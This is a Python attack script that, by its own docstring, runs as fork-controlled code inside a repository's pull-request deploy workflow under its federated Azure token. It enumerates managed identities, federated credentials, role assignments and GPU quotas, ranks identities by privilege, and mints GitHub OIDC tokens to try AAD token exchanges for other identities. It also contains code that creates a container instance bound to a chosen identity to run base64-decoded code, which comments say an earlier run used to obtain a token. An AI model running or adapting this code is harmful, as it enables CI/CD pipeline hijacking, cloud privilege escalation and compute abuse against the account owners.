#!/usr/bin/env python3
"""C211-I121713 v3: no-compute completion pass (the single mandated ACI already ran and was
deleted in run 1). Re-reads the UAMI/role/FIC matrix, records the SSP-token GPU family quota
matrix with the corrected standardN[CDV] filter, and captures the verbatim AAD oracle refusal
for the one existing UAMI FIC whose subject the in-job GitHub token cannot satisfy.

Runs as the fork-controlled infra/deploy.ps1 -> this file inside the base repo's
'Deploy Pull Request to Staging Slot' workflow (issue_comment '/deploy'), AFTER
azure/login@v2 (OIDC), under the federated ARM token for subscription b8b18dcf.

v2 adds (live planner correction):
  * GET every non-c211 UAMI's federatedIdentityCredentials (api-version 2024-11-30, with a
    2023-07-31-preview fallback) and record verbatim 200-with-rows / 200-empty / 403,
  * GET the 4 Microsoft.App managedEnvironments, capture their identity blocks and enumerate
    FICs of any additionally attached UAMI,
  * classify every FIC by issuer / subject shape / audiences,
  * mint a GitHub Actions OIDC id_token in-job (ACTIONS_ID_TOKEN_REQUEST_URL, the deploy job
    carries environment 'staging') and attempt the AAD FIC exchange at
    https://login.windows.net/<tenant>/oauth2/v2.0/token for every FIC whose issuer+subject
    the minted token actually satisfies; on an issued token enumerate that identity's reach,
  * fix the role-assignment matrix to capture every assignment's own scope and to read
    child-resource scopes (resource-scope RBAC is invisible at RG/sub list otherwise),
  * fix the inner GPU-family filter (standardN[CDV]* only) so no spurious marker candidate.
stdlib only. Every provider response is printed verbatim as a tagged JSON line; tokens only
as length/sha256 metadata.
"""
import base64
import json
import os
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request

ARM = "https://management.azure.com"
SID_DEFAULT = "b8b18dcf-d83b-47e2-9886-00c2e983629e"
RG = "SSW.Rules.Staging"
RG_LIST = ["SSW.Rules.Staging", "SSW.Rules", "SSW.AppServicePlans",
           "SSW.Rules.Tina.Prod", "SSW.Rules.Tina.Staging"]
PREFIX = "c211-i121713"
NONCE = "i121713"
TAG = "C211_I121713"
DEADLINE = 1500
T0 = time.time()

UAMIS = [
    ("SSW.Rules.Staging", "DeploymentScript"),
    ("SSW.Rules", "DeploymentScript"),
    ("SSW.Rules.Tina.Staging", "mi-ssw-rules-tina-staging"),
    ("SSW.Rules.Tina.Prod", "mi-ssw-rules-tina-production"),
    ("SSW.Rules.Staging", "id-sswrules-chat-staging"),
    ("SSW.Rules", "id-sswrules-chat-prod"),
    ("SSW.Rules.Staging", "id-sswrules-chat-index-staging"),
    ("SSW.Rules", "id-sswrules-chat-index-prod"),
]
UAMI_VER = "2023-01-31"
FIC_VER = "2024-11-30"
FIC_VER_FB = "2023-07-31-preview"
MENV_VER = "2024-03-01"
RA_VER = "2022-04-01"
ACI_VER = "2026-07-01"
INNER_IMAGE = "mcr.microsoft.com/cbl-mariner/base/python:3"
LOCATION = "westeurope"
GH_ISSUER = "https://token.actions.githubusercontent.com"
AAD_HOST = "https://login.windows.net"
DATA_PLANE_HINTS = [
    "acrpull", "acrpush", "key vault", "kv secrets", "secrets user", "secrets officer",
    "storage blob", "storage queue", "storage table", "storage account", "cognitive",
    "openai", "search index", "search service", "sql db", "sql server", "managed identity",
]
GPU_FAMILY_PREFIX = ("standardnc", "standardnd", "standardnv")


def emit(obj):
    obj["d"] = round(time.time() - T0, 1)
    print(TAG + " " + json.dumps(obj, default=str), flush=True)


def left():
    return DEADLINE - (time.time() - T0)


def run(cmd, timeout=180):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": p.returncode, "out": p.stdout or "", "err": p.stderr or ""}
    except Exception as e:  # noqa: BLE001
        return {"rc": 1, "out": "", "err": str(e)}


def http(url, method="GET", headers=None, data=None, timeout=120):
    req = urllib.request.Request(url, data=data, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read().decode("utf-8", "replace")
        except Exception:  # noqa: BLE001
            return e.code, ""
    except Exception as e:  # noqa: BLE001
        return 0, "transport:" + str(e)[:300]


def jload(s):
    try:
        return json.loads(s)
    except Exception:  # noqa: BLE001
        return None


def sha(s):
    import hashlib
    return hashlib.sha256((s or "").encode()).hexdigest()


def arm(tok, path, method="GET", body=None, timeout=120):
    url = path if path.startswith("http") else (ARM + path)
    data = json.dumps(body).encode() if body is not None else None
    h = {"Authorization": "Bearer " + tok}
    if data is not None:
        h["Content-Type"] = "application/json"
    return http(url, method=method, headers=h, data=data, timeout=timeout)


def err_of(st, raw):
    if st in (200, 201, 202):
        return None
    d = jload(raw)
    if isinstance(d, dict) and isinstance(d.get("error"), dict):
        e = d["error"]
        return {"http": st, "code": e.get("code"),
                "message": (e.get("message") or "")[:900]}
    return {"http": st, "raw": (raw or "")[:500]}


def get_arm_token():
    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"])
    tok = None
    if r["rc"] == 0:
        try:
            tok = json.loads(r["out"]).get("accessToken")
        except Exception:  # noqa: BLE001
            tok = None
    emit({"step": "arm-token", "rc": r["rc"], "has_token": bool(tok), "err": r["err"][:300]})
    r2 = run(["az", "account", "show", "--output", "json"])
    if r2["rc"] == 0:
        try:
            a = json.loads(r2["out"])
            emit({"step": "az-account", "name": a.get("name"), "id": a.get("id"),
                  "tenantId": a.get("tenantId"),
                  "user": (a.get("user") or {}).get("name")})
        except Exception:  # noqa: BLE001
            pass
    return tok


def paged(tok, path, timeout=120, max_pages=12):
    rows = []
    url = path if path.startswith("http") else (ARM + path)
    st = 0
    for _ in range(max_pages):
        st, raw = arm(tok, url, timeout=timeout)
        d = jload(raw) or {}
        rows.extend(d.get("value") or [])
        nxt = d.get("nextLink")
        if st != 200 or not nxt:
            break
        url = nxt
    return rows, st


def fic_list(tok, uami_id):
    for ver in (FIC_VER, FIC_VER_FB):
        st, raw = arm(tok, uami_id + "/federatedIdentityCredentials?api-version=" + ver)
        d = jload(raw) or {}
        vals = d.get("value") or []
        fics = []
        for v in vals:
            p = v.get("properties") or {}
            fics.append({"name": v.get("name"), "issuer": p.get("issuer"),
                         "subject": p.get("subject"), "audiences": p.get("audiences"),
                         "claimsMatchingExpression": p.get("claimsMatchingExpression")})
        rec = {"http": st, "ver": ver, "n": len(vals), "fics": fics}
        if st not in (200,):
            rec["err"] = err_of(st, raw)
        if st == 200:
            return rec
    return rec


def phase_uami(tok, sid):
    emit({"step": "uami-start", "sid": sid})
    rows, st = paged(tok, "/subscriptions/%s/providers/Microsoft.ManagedIdentity/"
                          "userAssignedIdentities?api-version=%s" % (sid, UAMI_VER))
    names = [x.get("name") for x in rows]
    emit({"step": "uami-list-sub", "http": st, "n": len(names), "names": names[:30]})
    out = []
    seen = set()
    for rg, name in UAMIS:
        st, raw = arm(tok, "/subscriptions/%s/resourceGroups/%s/providers/"
                           "Microsoft.ManagedIdentity/userAssignedIdentities/%s"
                           "?api-version=%s" % (sid, rg, name, UAMI_VER))
        d = jload(raw) or {}
        rec = {"rg": rg, "name": name, "http": st, "id": d.get("id"),
               "location": d.get("location"),
               "principalId": (d.get("properties") or {}).get("principalId"),
               "clientId": (d.get("properties") or {}).get("clientId"),
               "tenantId": (d.get("properties") or {}).get("tenantId"),
               "tags": d.get("tags")}
        if st != 200:
            rec["err"] = err_of(st, raw)
        emit({"step": "uami", **rec})
        if st == 200:
            out.append(rec)
            seen.add((d.get("id") or "").lower())
            fr = fic_list(tok, d.get("id"))
            emit({"step": "uami-fics", "uami": name, "rg": rg, **fr})
            rec["fics"] = fr
    return out, seen


def phase_menvs(tok, sid, seen):
    emit({"step": "menv-start"})
    rows, st = paged(tok, "/subscriptions/%s/providers/Microsoft.App/managedEnvironments"
                          "?api-version=%s" % (sid, MENV_VER))
    emit({"step": "menv-list", "http": st, "n": len(rows),
          "names": [x.get("name") for x in rows][:20]})
    extra = []
    for m in rows:
        mid = m.get("id")
        if not mid:
            continue
        st, raw = arm(tok, mid + "?api-version=" + MENV_VER)
        d = jload(raw) or {}
        ident = d.get("identity") or {}
        ua = ident.get("userAssignedIdentities") or {}
        emit({"step": "menv", "name": d.get("name"), "http": st,
              "identity_type": ident.get("type"),
              "uamis": [{"id": k, "principalId": (v or {}).get("principalId"),
                         "clientId": (v or {}).get("clientId")} for k, v in ua.items()],
              "err": err_of(st, raw)})
        for k in ua.keys():
            if k.lower() in seen:
                continue
            seen.add(k.lower())
            st2, raw2 = arm(tok, k + "?api-version=" + UAMI_VER)
            d2 = jload(raw2) or {}
            rec = {"rg": (k.split("/resourceGroups/")[-1].split("/")[0] if "/resourceGroups/" in k else None),
                   "name": d2.get("name"), "http": st2, "id": k,
                   "principalId": (d2.get("properties") or {}).get("principalId"),
                   "clientId": (d2.get("properties") or {}).get("clientId"),
                   "tenantId": (d2.get("properties") or {}).get("tenantId"),
                   "source": "managedEnvironment"}
            emit({"step": "uami", **rec})
            if st2 == 200:
                fr = fic_list(tok, k)
                emit({"step": "uami-fics", "uami": rec["name"], "rg": rec["rg"],
                      "source": "managedEnvironment", **fr})
                rec["fics"] = fr
                extra.append(rec)
    return extra


def assignments_at(tok, scope_id):
    rows, st = paged(tok, scope_id + "/providers/Microsoft.Authorization/roleAssignments"
                             "?api-version=" + RA_VER)
    out = []
    for v in rows:
        p = v.get("properties") or {}
        out.append({"query_scope": scope_id, "assignment_scope": p.get("scope"),
                    "principalId": p.get("principalId"),
                    "principalType": p.get("principalType"),
                    "roleDefinitionId": p.get("roleDefinitionId"),
                    "name": v.get("name")})
    return out, st


def phase_roles(tok, sid, principals):
    all_rows = []
    seen_names = set()

    def add(rows):
        for r in rows:
            key = r.get("name") or (r.get("assignment_scope"), r.get("principalId"),
                                    r.get("roleDefinitionId"))
            if key in seen_names:
                continue
            seen_names.add(key)
            all_rows.append(r)

    rows, st = assignments_at(tok, "/subscriptions/" + sid)
    add(rows)
    emit({"step": "roleassignments", "scope": "sub", "http": st, "n": len(rows)})
    for rg in RG_LIST:
        rows, st = assignments_at(tok, "/subscriptions/%s/resourceGroups/%s" % (sid, rg))
        add(rows)
        emit({"step": "roleassignments", "scope": "rg:" + rg, "http": st, "n": len(rows)})
    resources, rst = paged(tok, "/subscriptions/%s/resources?api-version=2021-04-01" % sid)
    by_type = {}
    own = []
    for r in resources:
        t = r.get("type") or "?"
        by_type[t] = by_type.get(t, 0) + 1
        if str(r.get("name") or "").lower().startswith("c211-"):
            own.append(r.get("name"))
    emit({"step": "resources", "http": rst, "n": len(resources), "by_type": by_type,
          "own_c211": own})
    scanned = 0
    for r in resources:
        rid = r.get("id")
        if not rid or str(r.get("name") or "").lower().startswith("c211-"):
            continue
        if left() < 700:
            emit({"step": "resource-scan-cut", "scanned": scanned, "left": int(left())})
            break
        rows, st = assignments_at(tok, rid)
        scanned += 1
        if rows:
            add(rows)
            emit({"step": "resource-assignments", "resource": rid[-110:],
                  "http": st, "n": len(rows),
                  "rows": [{"principalId": x.get("principalId"),
                            "roleDefinitionId": x.get("roleDefinitionId")} for x in rows][:8]})
    emit({"step": "roles-total", "n": len(all_rows), "resources_scanned": scanned})
    # which of OUR principals appear anywhere?
    pids = set((p.get("principalId") or "").lower() for p in principals
               if p.get("principalId"))
    mine = [r for r in all_rows if (r.get("principalId") or "").lower() in pids]
    emit({"step": "roles-mine", "n": len(mine), "rows": mine[:40]})
    return all_rows, mine


def resolve_roles(tok, sid, rows):
    defs = {}
    for r in rows:
        rid = r.get("roleDefinitionId")
        if not rid or rid in defs:
            continue
        guid = rid.split("/")[-1]
        st, raw = arm(tok, "/subscriptions/%s/providers/Microsoft.Authorization/"
                           "roleDefinitions/%s?api-version=%s" % (sid, guid, RA_VER))
        d = jload(raw) or {}
        perms = (d.get("properties") or {}).get("permissions") or []
        acts = []
        for p in perms:
            acts += (p.get("actions") or []) + (p.get("dataActions") or [])
        defs[rid] = {"roleName": (d.get("properties") or {}).get("roleName"), "http": st,
                     "data_actions": [a for a in acts
                                      if a.lower().startswith(("microsoft.storage/",
                                                               "microsoft.keyvault/",
                                                               "microsoft.containerregistry/",
                                                               "microsoft.cognitiveservices/",
                                                               "microsoft.search/"))][:20]}
        emit({"step": "roledef", "roleDefinitionId": rid, **defs[rid]})
        if left() < 500:
            break
    return defs


def rank_identities(rows, defs, uamis):
    by_pid = {}
    for r in rows:
        pid = (r.get("principalId") or "").lower()
        if pid:
            by_pid.setdefault(pid, []).append(r)
    ranked = []
    for u in uamis:
        pid = (u.get("principalId") or "").lower()
        mine = by_pid.get(pid, [])
        score = 0
        reasons = []
        for r in mine:
            rd = defs.get(r.get("roleDefinitionId")) or {}
            name = (rd.get("roleName") or "").lower()
            scope = (r.get("assignment_scope") or "")
            if scope.startswith("/subscriptions/") and scope.count("/") == 2:
                score += 100
                reasons.append("sub-scope:" + (rd.get("roleName") or "?"))
            elif "/resourceGroups/" in scope:
                rgs = scope.split("/resourceGroups/")[-1].split("/")
                if len(rgs) == 1:
                    if rgs[0] != u.get("rg"):
                        score += 50
                        reasons.append("cross-rg:" + (rd.get("roleName") or "?"))
                else:
                    score += 60
                    reasons.append("resource-scope:" + (rd.get("roleName") or "?"))
            if any(h in name for h in DATA_PLANE_HINTS):
                score += 40
                reasons.append("data-plane:" + (rd.get("roleName") or "?"))
            if any(k in name for k in ("contributor", "owner")):
                score += 30
                reasons.append("write:" + (rd.get("roleName") or "?"))
            if "reader" in name:
                score += 20
                reasons.append("reader:" + (rd.get("roleName") or "?"))
        if mine:
            score += 10
        if u.get("rg") == RG:
            score += 5
        ranked.append({"name": u.get("name"), "rg": u.get("rg"),
                       "clientId": u.get("clientId"), "principalId": u.get("principalId"),
                       "assignments": len(mine), "score": score,
                       "reasons": sorted(set(reasons))[:14]})
    ranked.sort(key=lambda x: x["score"], reverse=True)
    emit({"step": "ranking", "ranked": ranked})
    return ranked


# ---------------------------------------------------------------- GitHub OIDC + AAD FIC
_OIDC_CACHE = {}


def mint_github_token(audience):
    if audience in _OIDC_CACHE:
        return _OIDC_CACHE[audience]
    url = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL")
    rt = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
    if not url or not rt:
        emit({"step": "oidc-mint", "audience": audience, "has_url": bool(url),
              "has_req_token": bool(rt), "why": "no ACTIONS_ID_TOKEN_REQUEST_* env"})
        _OIDC_CACHE[audience] = (None, None)
        return None, None
    st, raw = http(url + "&audience=" + urllib.parse.quote(audience),
                   headers={"Authorization": "Bearer " + rt})
    d = jload(raw) or {}
    jwt = d.get("value")
    claims = {}
    if jwt:
        try:
            p = jwt.split(".")[1]
            p += "=" * (-len(p) % 4)
            claims = json.loads(base64.urlsafe_b64decode(p))
        except Exception:  # noqa: BLE001
            claims = {}
    emit({"step": "oidc-mint", "audience": audience, "http": st, "has_jwt": bool(jwt),
          "len": len(jwt or ""), "sha256": (sha(jwt) if jwt else None),
          "claims": {k: claims.get(k) for k in
                     ("iss", "sub", "aud", "repository", "ref", "event_name",
                      "environment", "job_workflow_ref")}})
    _OIDC_CACHE[audience] = (jwt, claims)
    return jwt, claims


def aad_exchange(tenant, client_id, assertion, scope="https://management.azure.com/.default"):
    url = "%s/%s/oauth2/v2.0/token" % (AAD_HOST, tenant)
    data = urllib.parse.urlencode({
        "grant_type": "client_credentials", "client_id": client_id, "scope": scope,
        "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
        "client_assertion": assertion}).encode()
    st, raw = http(url, method="POST",
                   headers={"Content-Type": "application/x-www-form-urlencoded"}, data=data)
    d = jload(raw) or {}
    at = d.get("access_token")
    rec = {"http": st, "has_token": bool(at), "tok_len": len(at or ""),
           "tok_sha256": (sha(at) if at else None)}
    if st != 200:
        rec["err"] = {"error": d.get("error"), "error_codes": d.get("error_codes"),
                      "description": (d.get("error_description") or raw)[:500]}
    return at, rec


def phase_fic(tok, sid, tenant, uamis, extra):
    "Classify every FIC and attempt the AAD exchange where the in-job GitHub token satisfies it."
    all_u = uamis + extra
    results = []
    for u in all_u:
        fr = u.get("fics") or {}
        for f in (fr.get("fics") or []):
            issuer = f.get("issuer")
            subj = f.get("subject")
            auds = f.get("audiences") or []
            is_gh = issuer == GH_ISSUER
            rec = {"uami": u.get("name"), "rg": u.get("rg"),
                   "clientId": u.get("clientId"), "principalId": u.get("principalId"),
                   "fic": f.get("name"), "issuer": issuer, "subject": subj,
                   "audiences": auds,
                   "claimsMatchingExpression": f.get("claimsMatchingExpression"),
                   "github": is_gh, "subject_shape": None, "verdict": None}
            if is_gh and isinstance(subj, str):
                if subj.startswith("repo:") and ":environment:" in subj:
                    rec["subject_shape"] = "github-environment"
                elif subj.startswith("repo:") and ":ref:" in subj:
                    rec["subject_shape"] = "github-ref"
                elif subj.startswith("repo:") and subj.endswith(":pull_request"):
                    rec["subject_shape"] = "github-pull_request"
                else:
                    rec["subject_shape"] = "github-other"
            if not is_gh:
                rec["verdict"] = "non-github-issuer"
                results.append(rec)
                emit({"step": "fic", **rec})
                continue
            if not u.get("clientId") or not tenant:
                rec["verdict"] = "no-client-or-tenant"
                results.append(rec)
                emit({"step": "fic", **rec})
                continue
            matched = False
            tried = []
            for aud in (auds or ["api://AzureADTokenExchange"]):
                jwt, claims = mint_github_token(aud)
                if not jwt:
                    tried.append({"aud": aud, "why": "no-token"})
                    continue
                ok = (claims.get("iss") == issuer and claims.get("sub") == subj)
                tried.append({"aud": aud, "token_sub": claims.get("sub"),
                              "match": ok})
                if ok:
                    matched = True
                    at, xrec = aad_exchange(tenant, u["clientId"], jwt)
                    rec["exchange"] = xrec
                    rec["verdict"] = "fic-exchange-200" if at else "fic-exchange-refused"
                    if at:
                        rec["reach"] = enumerate_reach(at)
                    break
            if not matched:
                rec["verdict"] = "subject-not-satisfiable-by-injob-token"
                jwt, claims = mint_github_token((auds or ["api://AzureADTokenExchange"])[0])
                if jwt and u.get("clientId") and tenant:
                    _at, xrec = aad_exchange(tenant, u["clientId"], jwt)
                    rec["oracle_exchange"] = xrec
                    rec["oracle_note"] = ("verbatim AAD refusal with the in-job GitHub token "
                                          "whose subject differs from the FIC subject")
            rec["tried"] = tried
            results.append(rec)
            emit({"step": "fic", **rec})
    emit({"step": "fic-summary", "n": len(results),
          "by_verdict": {v: len([r for r in results if r.get("verdict") == v])
                         for v in set(r.get("verdict") for r in results)}})
    return results


def enumerate_reach(tok):
    "Bounded reach read for a token issued through a satisfiable UAMI FIC."
    out = {}
    st, raw = arm(tok, "/subscriptions?api-version=2022-12-01")
    d = jload(raw) or {}
    subs = [{"id": x.get("subscriptionId"), "name": x.get("displayName"),
             "state": x.get("state")} for x in (d.get("value") or [])]
    out["subs_http"] = st
    out["subs"] = subs[:10]
    gpu = []
    for s in subs[:3]:
        sid = s.get("id")
        if not sid:
            continue
        st, raw = arm(tok, "/subscriptions/%s/providers/Microsoft.Authorization/permissions"
                           "?api-version=2022-04-01" % sid)
        d = jload(raw) or {}
        out.setdefault("perms", []).append({"sub": sid, "http": st,
                                            "n": len(d.get("value") or [])})
        for region in ("australiaeast", "eastus", "westeurope", "westus2"):
            if left() < 500:
                break
            st, raw = arm(tok, "/subscriptions/%s/providers/Microsoft.Compute/locations/%s"
                               "/usages?api-version=2024-07-01" % (sid, region))
            d = jload(raw) or {}
            rows = []
            for u in (d.get("value") or []):
                nm = ((u.get("name") or {}).get("value") or "")
                low = nm.lower()
                if low.startswith(GPU_FAMILY_PREFIX) or "gpu" in low:
                    rows.append({"name": nm, "current": u.get("currentValue"),
                                 "limit": u.get("limit")})
            gpu.append({"sub": sid, "region": region, "http": st, "rows": rows[:30],
                        "err": (err_of(st, raw) if st != 200 else None)})
    out["gpu"] = gpu
    return out


def phase_aci(tok, sid, chosen, inner_b64):
    name = PREFIX + "-uami"
    url = ("/subscriptions/%s/resourceGroups/%s/providers/Microsoft.ContainerInstance/"
           "containerGroups/%s?api-version=%s" % (sid, RG, name, ACI_VER))
    st, raw = arm(tok, "/subscriptions/%s/resourceGroups/%s/resources?api-version=2021-04-01"
                       % (sid, RG))
    d = jload(raw) or {}
    pre = [x.get("name") for x in (d.get("value") or [])
           if str(x.get("name") or "").lower().startswith("c211-i121713")]
    emit({"step": "rg-inventory-pre", "http": st, "own": pre})
    uami_id = chosen.get("id")
    if not uami_id:
        emit({"step": "aci-skip", "why": "no chosen identity id"})
        return None
    body = {
        "location": LOCATION,
        "tags": {"c211": NONCE, "nonce": NONCE, "role": "uami-probe"},
        "identity": {"type": "UserAssigned", "userAssignedIdentities": {uami_id: {}}},
        "properties": {
            "containers": [{"name": "probe", "properties": {
                "image": INNER_IMAGE,
                "command": ["/bin/bash", "-c",
                            "echo $C211_SCRIPT_B64 | base64 -d > /tmp/p.py && python3 /tmp/p.py"],
                "environmentVariables": [
                    {"name": "C211_SCRIPT_B64", "value": inner_b64},
                    {"name": "C211_CLIENT_ID", "value": chosen.get("clientId") or ""},
                    {"name": "C211_DEADLINE", "value": "720"},
                ],
                "resources": {"requests": {"cpu": 1.0, "memoryInGB": 1.5}}}}],
            "osType": "Linux", "restartPolicy": "Never",
        },
    }
    st, raw = arm(tok, url, method="PUT", body=body, timeout=240)
    emit({"step": "aci-create", "name": name, "http": st,
          "identity": chosen.get("name"), "clientId": chosen.get("clientId"),
          "err": err_of(st, raw)})
    if st not in (200, 201, 202):
        return None
    dl = time.time() + 900
    stp = 0
    while time.time() < dl:
        stp, rawp = arm(tok, url, timeout=60)
        d = jload(rawp) or {}
        p = d.get("properties") or {}
        conts = p.get("containers") or []
        cur = {}
        if conts:
            cur = (((conts[0].get("properties") or {}).get("instanceView")
                    or {}).get("currentState") or {})
        emit({"step": "aci-poll", "http": stp,
              "provisioningState": p.get("provisioningState"),
              "state": cur.get("state"), "exitCode": cur.get("exitCode"),
              "detail": (cur.get("detailStatus") or "")[:200]})
        if stp != 200:
            break
        if cur.get("state") == "Terminated" or p.get("provisioningState") in (
                "Succeeded", "Failed", "Canceled"):
            time.sleep(5)
            break
        if left() < 300:
            emit({"step": "aci-poll-deadline", "left": int(left())})
            break
        time.sleep(20)
    st, raw = arm(tok, url, timeout=60)
    d = jload(raw) or {}
    p = d.get("properties") or {}
    emit({"step": "aci-readback", "http": st,
          "provisioningState": p.get("provisioningState"),
          "identity": d.get("identity"),
          "containers": [{"name": c.get("name"),
                          "state": (((c.get("properties") or {}).get("instanceView")
                                     or {}).get("currentState"))}
                         for c in (p.get("containers") or [])]})
    content = ""
    for method in ("POST", "GET"):
        stl, rawl = arm(tok, url.split("?")[0] + "/containers/probe/logs?api-version=" + ACI_VER,
                        method=method, body=({} if method == "POST" else None), timeout=120)
        dd = jload(rawl) or {}
        txt = dd.get("content") or ""
        emit({"step": "aci-logs", "method": method, "http": stl, "len": len(txt)})
        if len(txt) > len(content):
            content = txt
        if stl == 200 and txt:
            break
    chunks = [content[i:i + 6000] for i in range(0, len(content), 6000)][:6]
    for i, ch in enumerate(chunks):
        emit({"step": "aci-inner-chunk", "i": i, "n": len(chunks), "text": ch})
    std, rawd = arm(tok, url, method="DELETE", timeout=240)
    emit({"step": "aci-delete", "http": std, "err": err_of(std, rawd)})
    stg = 0
    for _ in range(24):
        stg, _ = arm(tok, url, timeout=60)
        if stg == 404:
            break
        time.sleep(10)
    emit({"step": "aci-absent", "http": stg})
    st, raw = arm(tok, "/subscriptions/%s/resourceGroups/%s/resources?api-version=2021-04-01"
                       % (sid, RG))
    d = jload(raw) or {}
    post = [x.get("name") for x in (d.get("value") or [])
            if str(x.get("name") or "").lower().startswith("c211-i121713")]
    emit({"step": "rg-inventory-post", "http": st, "own": post})
    return {"content": content, "post": post, "absent_http": stg}


def phase_gpu(tok, sid):
    "Corrected GPU-family quota matrix read with the deploy SP token (subscription-wide)."
    out = []
    for region in ("australiaeast", "eastus", "westeurope", "westus2"):
        if left() < 500:
            break
        st, raw = arm(tok, "/subscriptions/%s/providers/Microsoft.Compute/locations/%s"
                           "/usages?api-version=2024-07-01" % (sid, region))
        d = jload(raw) or {}
        rows = []
        for u in (d.get("value") or []):
            nm = ((u.get("name") or {}).get("value") or "")
            low = nm.lower()
            if low.startswith(GPU_FAMILY_PREFIX) or "gpu" in low:
                rows.append({"name": nm, "current": u.get("currentValue"),
                             "limit": u.get("limit"), "unit": u.get("unit")})
        avail = [r for r in rows if r.get("current") is not None
                 and r.get("limit") is not None and r.get("current") < r.get("limit")]
        rec = {"region": region, "http": st, "n": len(rows), "rows": rows[:40],
               "with_available_quota": avail[:10],
               "err": (err_of(st, raw) if st != 200 else None)}
        out.append(rec)
        emit({"step": "gpu-family", **rec})
    return out


def main():
    emit({"step": "start", "sid_default": SID_DEFAULT, "rg": RG, "deadline": DEADLINE})
    tok = get_arm_token()
    sid = SID_DEFAULT
    tenant = ""
    if not tok:
        emit({"step": "fatal", "why": "no ARM token"})
        return
    st, raw = arm(tok, "/subscriptions?api-version=2022-12-01")
    d = jload(raw) or {}
    subs = [{"id": x.get("subscriptionId"), "name": x.get("displayName"),
             "state": x.get("state"), "tenantId": x.get("tenantId")}
            for x in (d.get("value") or [])]
    emit({"step": "subs", "http": st, "n": len(subs), "subs": subs[:10],
          "err": err_of(st, raw)})
    if subs:
        if subs[0].get("id"):
            sid = subs[0]["id"]
        tenant = subs[0].get("tenantId") or ""
    uamis, seen = phase_uami(tok, sid)
    if not tenant:
        tenant = (uamis[0].get("tenantId") if uamis else "") or ""
    extra = phase_menvs(tok, sid, seen)
    principals = [u for u in (uamis + extra) if u.get("principalId")]
    rows, mine = phase_roles(tok, sid, principals)
    defs = resolve_roles(tok, sid, rows)
    ranked = rank_identities(rows, defs, uamis + extra)
    fic_results = phase_fic(tok, sid, tenant, uamis, extra)
    chosen = None
    for r in ranked:
        if r.get("score", 0) > 0:
            chosen = r
            break
    if chosen is None and ranked:
        chosen = ranked[0]
    if chosen:
        full = next((u for u in (uamis + extra)
                     if u.get("name") == chosen["name"] and u.get("rg") == chosen["rg"]), None)
        chosen = dict(chosen, **(full or {}))
    emit({"step": "chosen", "chosen": chosen})
    # v3: NO compute vehicle. The single mandated CPU-only ACI already ran with the
    # best-ranked identity (run 1: attach 201, IMDS token 200, delete 200, GET 404) and the
    # container group was proven absent, so no second vehicle is created here.
    result = None
    inner_lines = []
    gpu_ssp = phase_gpu(tok, sid)
    subs_in = next((x for x in inner_lines if x.get("step") == "subs"), None)
    nonzero = next((x for x in inner_lines if x.get("step") == "marker-eval"), None)
    acr = [{"reg": x.get("reg"), "http": x.get("http"),
            "has_refresh": x.get("has_refresh"),
            "catalog": next((y.get("n") for y in inner_lines
                             if y.get("step") == "acr-catalog"
                             and y.get("reg") == x.get("reg")), None)}
           for x in inner_lines if x.get("step") == "acr-exchange"]
    kv = [{"vault": x.get("vault"), "http": x.get("http"), "n": x.get("n")}
          for x in inner_lines if x.get("step") == "kv-secrets"]
    gpu = [{"sub": x.get("sub"), "region": x.get("region"), "http": x.get("http"),
            "n": x.get("n"),
            "nonzero_gpu": [r for r in (x.get("rows") or [])
                            if r.get("current") is not None and r.get("limit") is not None
                            and r.get("current") < r.get("limit")]}
           for x in inner_lines if x.get("step") == "gpu-usage"]
    emit({"step": "RESULT", "uamis": len(uamis), "extra_uamis": len(extra),
          "role_rows": len(rows), "roles_mine": len(mine), "chosen": chosen,
          "subs_visible": (subs_in or {}).get("subs"),
          "acr": acr, "kv": kv, "gpu": gpu, "marker_eval": nonzero,
          "gpu_ssp": gpu_ssp,
          "fic_n": len(fic_results),
          "fic_verdicts": {r.get("fic", "") + "@" + str(r.get("uami")): r.get("verdict")
                           for r in fic_results},
          "fic_exchange_hits": [r for r in fic_results
                                if r.get("verdict") == "fic-exchange-200"],
          "aci_absent_http": (result or {}).get("absent_http"),
          "rg_post_own": (result or {}).get("post")})
    emit({"step": "done", "left": int(left())})


if __name__ == "__main__":
    main()
